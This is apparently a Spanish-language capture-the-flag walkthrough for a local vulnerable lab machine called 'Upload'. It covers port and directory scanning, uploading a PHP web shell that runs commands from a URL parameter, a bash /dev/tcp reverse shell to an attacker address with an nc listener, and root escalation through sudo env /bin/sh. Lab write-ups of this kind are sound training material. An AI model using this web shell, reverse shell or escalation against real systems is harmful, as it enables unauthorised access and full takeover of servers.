
# 2. Máquina: Upload  

<a href="https://github.com/GutsNet"><img title="Author" src="https://img.shields.io/badge/Author-GutsNet-red.svg?style=for-the-badge&logo=github"></a>

**Dificultad:** 🟢 *Fácil*

**Autor:** *[El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)*

**Fecha de creación:** *09/04/2024*

**Proceso:**
- [1. Despliegue](#desplegando-la-máquina-vulnerable)
- [2. Escaneo de puertos](#escaneo-de-puertos-con-nmap)
- [3. Página principal](#visualización-de-la-página-principal)
- [4. Enumeración de directorios](#enumeración-de-directorios-con-gobuster)
- [5. Escalada de privilegios](#escalada-de-privilegios)

---

## Desplegando la Máquina Vulnerable

```python
~/Upload ᐅ sudo bash auto_deploy.sh upload.tar
```
Este comando ejecuta un script de bash (`auto_deploy.sh`) que despliega la máquina vulnerable a partir del archivo `upload.tar`.

**Salida:**

```python
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

#### Verificación de Conectividad

```python
~/Upload ᐅ ping -c 2 172.17.0.2
```
El comando `ping -c 2` envía 2 paquetes ICMP a la dirección IP `172.17.0.2` para verificar la conectividad y la respuesta del host.

**Salida:**

```python
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=194 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.089 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1010ms
rtt min/avg/max/mdev = 0.089/97.292/194.496/97.203 ms
```

---

## Escaneo de Puertos con Nmap

```python
~/Upload ᐅ nmap -p- -sCV 172.17.0.2
```
Este comando revela que el puertos `80` (HTTP) está abierto ejecutando `Apache`.

**Salida:**

```python
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)
```

**Explicación de parámetros:**

- `-p-`: Escanea todos los puertos (del 1 al 65535).
- `-sCV`: Realiza un escaneo con detección de versión (`-sV`) y utiliza scripts básicos (`-sC`) para obtener más información del servicio.

---

## Visualización de la página principal

- **http://172.17.0.2**

  Como se puede observar, la página de inicio es un formulario que nos permite subir archivos a un servidor.

  ![image](https://github.com/user-attachments/assets/83047ec1-69f6-49c1-9058-1d2083f8b4d2)

---

## Enumeración de Directorios con Gobuster

```python
~/Upload ᐅ gobuster dir -w $seclists/Discovery/Web-Content/big.txt -u http://172.17.0.2:80/ -t 200 --no-error
```

**Salida:**

```python
...
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
...
```

De acuerdo a la enumeración de directorios, es posible acceder la ruta `/uploads`, en donde encontraremos todos los archivos que se suban al servidor.

**Explicación de parámetros:**

- `dir`: Modo de enumeración de directorios.
- `-w`: Especifica la wordlist a utilizar.
- `-u`: URL objetivo a escanear.
- `-t 200`: Define el número de hilos a usar (200 en este caso).
- `--no-error`: Oculta los errores emitidos por Gobuster.

#### **http://172.17.0.2/uploads**

![image](https://github.com/user-attachments/assets/f67412f7-3bfc-41ae-affa-4ecdfe12fabb)

---

## Escalada de privilegios.

En este caso, al tener acceso a la ruta en la que se alamacenan los archivos subidos, se puede intentar subir un archivo con extensión `.php`, el cual contendrá un script que permitirá la ejecución de una reverse shell.

El archivo que se subirá tendrá el nombre: reverse.php

### **Explicación de reverse.php**
```php
<?php
        system($_GET['rev']);
?>
```

- `<?php ... ?> ` :  Esto indica el inicio y el fin de un bloque de código.
- `system($_GET['rev']);` :  En esta línea ocurre la operación principal.
- `system()` :  Esta funcón ejecuta un comando directamente del sistema operativo y muestra la salida.
- `$_GET['rev']` :  $_GET es un array superglobal que recoge los datos enviados a través de la consulta de la URL (`?rev=comando`) usando el método GET. En este caso, está buscando un parámetro llamado `rev`. 

Antes de ponerlo a prueba, es necesario subir el script a el servidor.
  
 ![image](https://github.com/user-attachments/assets/d69ce36a-c297-452e-85de-ae09e618eb3a)

### **Ejemplo de uso de reverse.php**

**http://172.17.0.2/uploads/reverse.php?rev=whoami**

- `http://172.17.0.2/uploads/reverse.php`: Esta parte especifica la ubicación del archivo `reverse.php` en el servidor.
- `?rev=whoami`: Esto pasa el valor "whoami" a la variable `$_GET['rev']` en el archivo PHP. Este valor es el comando de linux que nos permite saber el nombre del usuario actual, si el funcionamiento del script es correcto, motrará un texto similar a `www-data` en el navegador, como se muestra en la imagen de abajo.

![image](https://github.com/user-attachments/assets/68eead14-ecc8-49c8-95e9-1cceb69883ea)

### **Ejecución de la reverse shell**

http://172.17.0.2/uploads/reverse.php?rev=bash -c "bash -i >%26 /dev/tcp/192.168.1.100/6969 0>%261"

- `bash -c`: Ejecuta el siguiente comando en una nueva instancia de bash. Esto permite aislar la ejecución del comando del entorno actual.
- `bash -i` :Ejecuta bash en modo interactivo. Esto crea una nueva sesión de shell interactiva, permitiendo al usuario ingresar comandos.
- `>%26`: Redirige tanto la salida estándar (stdout) como la entrada estándar de error (stderr) al dispositivo especificado.
- `/dev/tcp/192.168.1.100/6969`: Es un "archivo" especial en sistemas Linux que establece una conexión TCP a la dirección IP 192.168.1.100 en el puerto 6969. Toda la salida y los errores se envían a esta conexión. La IP cambiará en cada dispositivo, se puede comprobar con el comando `ifconfig` o `ip addr`.
- `0>%261`: Redirige la entrada estándar (stdin) de la shell a la misma conexión TCP. Esto permite una comunicación interactiva a través de la conexión de red.

#### Proceso:

- **Fase de Preparación**: El atacante inicia un listener en su máquina en el puerto 6969 utilizando el comando `nc -lvnp 6969`. Esto prepara la máquina atacante para recibir la conexión de la reverse shell.
```python
~/Upload ᐅ nc -lvnp 6969
listening on [any] 6969 ...
```

- **Ejecución**: Al acceder a la URL `http://172.17.0.2/uploads/reverse.php?rev=bash -c "bash -i >%26 /dev/tcp/192.168.1.100/6969 0>%261"`, el archivo `reverse.php` ejecuta el comando enviado a través del parámetro `rev`. Este comando inicia una conexión desde la máquina víctima a la máquina atacante.
```python
listening on [any] 6969 ...
connect to [192.168.1.100] from (UNKNOWN) [172.17.0.2] 41906
bash: cannot set terminal process group (25): Inappropriate ioctl for device
bash: no job control in this shell
www-data@c925d2eea10b:/var/www/html/uploads$
```

- **Resultado**: Una vez ejecutado el comando, la máquina víctima establece una conexión con la máquina atacante, permitiendo al atacante obtener una shell interactiva con el usuario `www-data`.
```python
www-data@c925d2eea10b:/var/www/html/uploads$ whoami
whoami
www-data
```

### **Acceso root**
#### Enumeración de Privilegios Sudo
```python
www-data@c925d2eea10b:/var/www/html/uploads$ sudo -l
 ```

Este comando muestra que el usuario `www-data` tiene permisos para ejecutar `env` con privilegios de superusuario.

**Salida:**

```python
sudo -l
Matching Defaults entries for www-data on c925d2eea10b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on c925d2eea10b:
    (root) NOPASSWD: /usr/bin/env
```

#### Búsqueda de técnicas de escalada de privilegios con <a href="https://github.com/r1vs3c/searchbins">Searchbins</a>

```python
~/Upload ᐅ searchbins -b env -f sudo
```

Searchbins sugiere la técnica que se muestra en la salida para escalar privilegios utilizando `env` cuando se puede ejecutar como superusuario.

**Salida:**
```python

[+] Binary: env

================================================================================
[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/env/#sudo]

        | sudo env /bin/sh
```

#### Ejecución de la Escalada de Privilegios

```python
www-data@c925d2eea10b:/var/www/html/uploads$ sudo env /bin/sh
```

Este comando utiliza `env` con privilegios de superusuario para ejecutar un shell con permisos de root.

**Comprobación:**
```python
sudo env /bin/sh
whoami
root
```


